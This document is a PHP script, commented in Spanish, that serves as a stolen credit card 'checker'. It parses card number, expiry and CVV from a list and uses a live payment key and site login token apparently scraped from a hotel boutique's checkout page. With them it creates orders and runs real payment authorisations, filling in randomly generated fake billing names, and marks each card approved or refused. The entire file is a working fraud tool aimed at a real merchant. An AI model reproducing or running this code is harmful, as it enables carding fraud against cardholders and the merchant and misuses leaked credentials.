<?php
ignore_user_abort(true);
error_reporting(0);
session_start();

// HEADERS JSON
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Función para sanitizar inputs
function sanitizeInput($input) {
    return htmlspecialchars(strip_tags(trim($input)), ENT_QUOTES, 'UTF-8');
}

// Validar lista recibida
if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió lista de tarjetas',
        'html' => '<span class="badge badge-danger">Error</span> ➔ No se recibió lista...'
    ]);
    exit();
}

$lista = sanitizeInput($_GET['lista']);
$delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");

// Validar formato
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);
if (!preg_match("/^[0-9]{15,16}\|[0-9]{1,2}\|[0-9]{2,4}\|[0-9]{3,4}$/", $regex)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato de lista inválido',
        'html' => '<span class="badge badge-danger">Error</span> ➔ Formato inválido...'
    ]);
    exit();
}

// Extraer componentes
function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$parts = multiexplode($delimiters, $lista);
if (count($parts) < 4) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato incompleto',
        'html' => '<span class="badge badge-danger">Error</span> ➔ Formato incompleto...'
    ]);
    exit();
}

$cc = preg_replace('/[^0-9]/', '', $parts[0]);
$mes = preg_replace('/[^0-9]/', '', $parts[1]);
$ano = preg_replace('/[^0-9]/', '', $parts[2]);
$cvv = preg_replace('/[^0-9]/', '', $parts[3]);

// Validaciones básicas
if (strlen($cc) < 15 || strlen($cc) > 16) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Número de tarjeta inválido',
        'html' => '<span class="badge badge-danger">Error</span> ➔ Número inválido...'
    ]);
    exit();
}

if ($mes < 1 || $mes > 12) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Mes inválido',
        'html' => '<span class="badge badge-danger">Error</span> ➔ Mes inválido...'
    ]);
    exit();
}

// Formatear fecha
if (strlen($mes) == 1) $mes = "0" . $mes;
if (strlen($ano) == 2) $ano = "20" . $ano;

// Validar fecha de expiración
$current_year = date('Y');
$current_month = date('n');
if ($ano < $current_year || ($ano == $current_year && $mes < $current_month)) {
    echo json_encode([
        'status' => 'rejected',
        'message' => 'Tarjeta expirada',
        'html' => '<span class="badge badge-danger">Rechazada</span> ➔ Tarjeta expirada'
    ]);
    exit();
}

// Determinar tipo de tarjeta
$tipo = "Desconocido";
$patterns = [
    "Visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
    "Master" => "/^(5[1-5]|2[2-7])[0-9]{14}$/",
    "Amex" => "/^3[47][0-9]{13}$/",
    "Elo" => "/^((((636368)|(438935)|(504175)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(4011))\d{0,12})$/",
    "Hipercard" => "/^(606282\d{10}(\d{3})?)|(3841\d{15})$/",
    "Discover" => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
];

foreach ($patterns as $brand => $pattern) {
    if (preg_match($pattern, $cc)) {
        $tipo = $brand;
        break;
    }
}

if ($tipo == "Desconocido") {
    echo json_encode([
        'status' => 'rejected',
        'message' => 'Tarjeta no soportada',
        'html' => '<span class="badge badge-danger">Rechazada</span> ➔ Tarjeta no soportada'
    ]);
    exit();
}

// CONFIGURACIÓN EXTRAÍDA DEL HTML
$originKey = "live_HUXJBKI5ANBP3K7SERDUYUTEPUW5NMNQ";
$adyen_key = "10001|A72F18FE5A649DB114E01BFB787BD82FF3E6D28B3AB3E2D09CF69478378E16F5C2080288D859937B48B146F5FF56869BCC330061719EDD64865196BC8186DA18445996C498A9649489C9B4CBF55EB4A45956B1B84FC2D2E11988E7F4599239C8398B1AD82946FA42DA2B14655837AD78D4171528D7691B80E6519AA9D1AC3C5773483AD476D5A9590B115582B658A89200B224F6056E2B4ECBC6A712FDBEA25A597018E5D462B70360A0BB9C40EB86219A04AADF27A389A6033616F7AE9BA3FDD6C9D328628C0CF7B494E4B8333B0D2DAFB7D0A47C2E3DC6B90A3A4E78C04DDB19C8335C01DA987CE1351D449AE2BD877A6C865A7380F3A953F13FC6F710E509";
$checkoutShopperUrl = "https://checkoutshopper-live.adyen.com/checkoutshopper/";

// CONFIGURACIÓN SHANGRI-LA
$client_id = "14";
$promotion_id = "1";
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$api_locale = "en";
$adyen_version = "_0_1_25";
$return_url = "https://boutique.shangri-la.com/adyen_card_redirect.php";
$hotel_code = "ISL";
$site_login_token = "beQDmTL1oVRPZmOLWQdnFXCtRC4Eu5M81h3KtAiWIM0VMTki7RXw9RPrFlXLhoP42a5YNETYAcPVdmv8";

// Función para hacer peticiones CURL
function makeRequest($url, $data, $headers = []) {
    $ch = curl_init();
    
    $defaultHeaders = [
        "Accept: application/json",
        "Content-Type: application/json",
        "Referer: https://boutique.shangri-la.com/food_checkout.php",
        "Origin: https://boutique.shangri-la.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $defaultHeaders,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3
    ];
    
    curl_setopt_array($ch, $options);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error,
        'success' => $http_code == 200 && empty($error)
    ];
}

try {
    // PASO 1: CREAR ORDEN
    $init_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "hotel_code" => $hotel_code,
        "return_url" => $return_url,
        "order_amount" => 100,
        "payment_method" => "adyen"
    ];

    $init_result = makeRequest($api_endpoint . "/checkout_init.php", $init_data);

    if (!$init_result['success']) {
        throw new Exception("Error al crear orden: " . $init_result['error']);
    }

    $init_response = json_decode($init_result['response'], true);
    
    if (json_last_error() !== JSON_ERROR_NONE || !isset($init_response['order_number'])) {
        throw new Exception("Respuesta inválida al crear orden");
    }

    $order_number = $init_response['order_number'];
    $order_token = $init_response['order_token'];
    $order_amount = isset($init_response['order_amount']) ? $init_response['order_amount'] : 100;

    // PASO 2: ENCRIPTAR TARJETA
    $encrypt_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "order_number" => $order_number,
        "order_token" => $order_token,
        "card" => $cc,
        "month" => (int)$mes,
        "year" => $ano,
        "cvv" => $cvv,
        "adyen_key" => $adyen_key,
        "adyen_version" => $adyen_version
    ];

    $encrypt_result = makeRequest($api_endpoint . "/adyen_encrypt.php", $encrypt_data);

    if (!$encrypt_result['success']) {
        throw new Exception("Error al encriptar tarjeta: " . $encrypt_result['error']);
    }

    $encrypted_response = json_decode($encrypt_result['response'], true);
    
    if (json_last_error() !== JSON_ERROR_NONE || !isset($encrypted_response['encryptedCardNumber'])) {
        throw new Exception("Error en encriptación de tarjeta");
    }

    $encryptedCardNumber = $encrypted_response['encryptedCardNumber'];
    $encryptedExpiryMonth = $encrypted_response['encryptedExpiryMonth'];
    $encryptedExpiryYear = $encrypted_response['encryptedExpiryYear'];
    $encryptedSecurityCode = $encrypted_response['encryptedSecurityCode'];

    // Datos para el pago
    $nombres = ['Christo','Ryan','Ethan','John','Zoey','Sarah','Pedro','Lucas','Alex','Ana'];
    $apellidos = ['Walker','Thompson','Anderson','Johnson','Trembay','Peltier','Soares','Souza','Esquilo','Bila'];
    $nombre = $nombres[array_rand($nombres)];
    $apellido = $apellidos[array_rand($apellidos)];

    // PASO 3: PROCESAR PAGO
    $process_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "order_number" => $order_number,
        "order_token" => $order_token,
        "hotel_code" => $hotel_code,
        "encryptedCardNumber" => $encryptedCardNumber,
        "encryptedExpiryMonth" => $encryptedExpiryMonth,
        "encryptedExpiryYear" => $encryptedExpiryYear,
        "encryptedSecurityCode" => $encryptedSecurityCode,
        "amount" => [
            "value" => $order_amount,
            "currency" => "HKD"
        ],
        "return_url" => $return_url,
        "payment_method" => "adyen",
        "card_type" => $tipo,
        "billing_address" => [
            "firstName" => $nombre,
            "lastName" => $apellido,
            "email" => strtolower($nombre) . "." . strtolower($apellido) . "@gmail.com",
            "phone" => "+852" . rand(50000000, 99999999),
            "address" => [
                "street" => "Flat 12B, Tower 1",
                "houseNumberOrName" => "The Arch",
                "city" => "Hong Kong",
                "postalCode" => "000000",
                "country" => "HK"
            ]
        ]
    ];

    $process_result = makeRequest($api_endpoint . "/adyen_process.php", $process_data);

    if (!$process_result['success']) {
        throw new Exception("Error al procesar pago: " . $process_result['error']);
    }

    $process_response = json_decode($process_result['response'], true);
    
    if (json_last_error() !== JSON_ERROR_NONE) {
        throw new Exception("Respuesta inválida del procesador de pagos");
    }

    // Determinar resultado
    $card_masked = substr($cc, 0, 6) . '******' . substr($cc, -4);
    $expiry_masked = $mes . '/' . substr($ano, -2);

    if (isset($process_response['resultCode'])) {
        switch($process_response['resultCode']) {
            case 'Authorised':
                echo json_encode([
                    'status' => 'approved',
                    'message' => 'Pago autorizado',
                    'html' => '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
                             '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                             '<span class="badge badge-success">SHANGRI-LA EXPRESS</span>',
                    'data' => [
                        'card' => $card_masked,
                        'expiry' => $expiry_masked,
                        'bin' => substr($cc, 0, 6),
                        'last4' => substr($cc, -4),
                        'order_number' => $order_number,
                        'amount' => number_format($order_amount/100, 2) . ' HKD'
                    ]
                ]);
                break;
                
            case 'Refused':
                $reason = isset($process_response['refusalReason']) ? $process_response['refusalReason'] : 'Rechazado';
                echo json_encode([
                    'status' => 'rejected',
                    'message' => $reason,
                    'html' => '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ' .
                             '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                             '<span class="badge badge-warning">' . $reason . '</span>',
                    'data' => [
                        'card' => $card_masked,
                        'expiry' => $expiry_masked,
                        'reason' => $reason
                    ]
                ]);
                break;
                
            default:
                $reason = isset($process_response['refusalReason']) ? $process_response['refusalReason'] : $process_response['resultCode'];
                echo json_encode([
                    'status' => 'error',
                    'message' => $reason,
                    'html' => '<span class="badge badge-warning">⚠️ ERROR</span> ➔ ' .
                             '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                             '<span class="badge badge-warning">' . $reason . '</span>',
                    'data' => [
                        'card' => $card_masked,
                        'expiry' => $expiry_masked,
                        'result_code' => $process_response['resultCode']
                    ]
                ]);
        }
    } else {
        throw new Exception("Respuesta inesperada de la API");
    }

} catch (Exception $e) {
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage(),
        'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                 '<span class="badge badge-warning">' . $e->getMessage() . '</span>',
        'data' => [
            'error' => $e->getMessage()
        ]
    ]);
}
?>